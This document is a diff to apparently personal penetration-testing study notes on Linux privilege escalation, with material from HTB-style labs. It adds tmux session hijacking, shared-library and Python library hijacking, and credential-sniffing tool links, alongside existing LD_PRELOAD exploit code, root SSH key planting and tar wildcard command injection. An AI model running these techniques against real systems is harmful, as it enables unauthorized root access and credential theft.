@@ -26,6 +26,17 @@ If the file `etc/sudoers` /could be made editable (for example using `setfacl`, 
 setfacl -m u:$USER:$perm /etc/sudoers
 ```
 if `setfacl` can be run as sudo from low_priv user.
+## Shared Object Hijacking
+Executables with custom loaded libraries with improper permissions can allow us to create our own libraries to be linked with the program. Similar to [[#`env_keep+=LD_PRELOAD`|LD Preload]] below
+```shell-session
+$ ldd <executable>
+$ readelf -d <executable>  | grep PATH
+```
+### Python Library Hijacking
+3 basic vulnerabilities where we can hijack:
+1. Wrong write permissions
+2. Library Path
+3. PYTHONPATH environment variable
 ## Writeable Files/Directories
 ```shell-session
 $ find / -path /proc -prune -o -type <f/d> -perm -o+w 2>/dev/null
@@ -37,9 +48,20 @@ Generate public-private key and paste the public in server
 ```bash
 echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
 ```
-# [[Databases]]
-# Environment Variables
-## `env_keep+=LD_PRELOAD`
+# Information Gathering
+## OS Release
+```shell-session
+$ cat /etc/os-release
+```
+## System Path
+```shell-session
+$ echo $PATH
+```
+## Environment Variables
+```shell-session
+$ env
+```
+### `env_keep+=LD_PRELOAD`
 If we can run any one command as root with this environment variable, we can load our own malicious shared library here.
 ```C
 #include <stdio.h>
@@ -57,20 +79,6 @@ void _init() {
 ```shell-session
 $ gcc -fPIC -shared -nostartfiles -o exploit.so exploit.c
 $ sudo LD_PRELOAD=exploit.so <COMMAND>
-```
-
-# Information Gathering
-## OS Release
-```shell-session
-$ cat /etc/os-release
-```
-## System Path
-```shell-session
-$ echo $PATH
-```
-## Environment Variables
-```shell-session
-$ env
 ```
 ## Environment
 ```shell-session
@@ -110,6 +118,10 @@ $ find / -user root -perm -<4/6>000 -exec ls -ldb {} \; 2>/dev/null
 ```
 ## Processes
 Check running processes, could hint at possible VM machine, prompting [[VM Escape]].
+## Passive Traffic Capture
+If `tcpdump` installed, can try to sniff traffic to get any cleartext data. Can use tools like:
+- [net-creds](https://github.com/DanMcInerney/net-creds)
+- [PCredz](https://github.com/lgandx/PCredz)
 # Service-based
 ## Logrotate
 ## LXD
@@ -119,6 +131,29 @@ Check running processes, could hint at possible VM machine, prompting [[VM Escap
 2. **`/etc/cron.d`**
 3. **`/etc/cron.daily/`**
 4. **`/var/spool/cron/crontabs/root`**
+## Tmux
+A user may leave a `tmux` process running as a privileged user, such as root set up with weak permissions. This may be done by creating a new shared session and modifying the ownership.
+
+Need to compromise a user in the `dev` group
+```shell-session
+$ tmux -S /shareds new -s debugsess
+$ chown root:devs /shareds
+
+#If we can compromise a user in the `dev` group, 
+#we can attach to this session and gain root access.
+
+$  ps aux | grep tmux
+root      4806  0.0  0.1  29416  3204 ?        Ss   06:27   0:00 tmux -S /shareds new -s debugsess
+
+$ ls -la /shareds 
+srw-rw---- 1 root devs 0 Sep  1 06:27 /shareds
+
+$ id
+uid=1000(htb) gid=1000(htb) groups=1000(htb),1011(devs)
+
+$ tmux -S /shareds
+```
+# [[Databases]]
 # Wildcard Abuse
 When certain applications are run with wildcards, they can be abused:
 Example:
@@ -132,7 +167,6 @@ $ echo "" > "--checkpoint-action=exec=sh root.sh"
 $ echo "" > --checkpoint=1
 ```
 This will replace the wildcard with these files which will act as flags for the `tar` command in the cron job.
-
 # Hardening Services
 Look out for system defenses such as:
 - [Exec Shield](https://en.wikipedia.org/wiki/Exec_Shield)
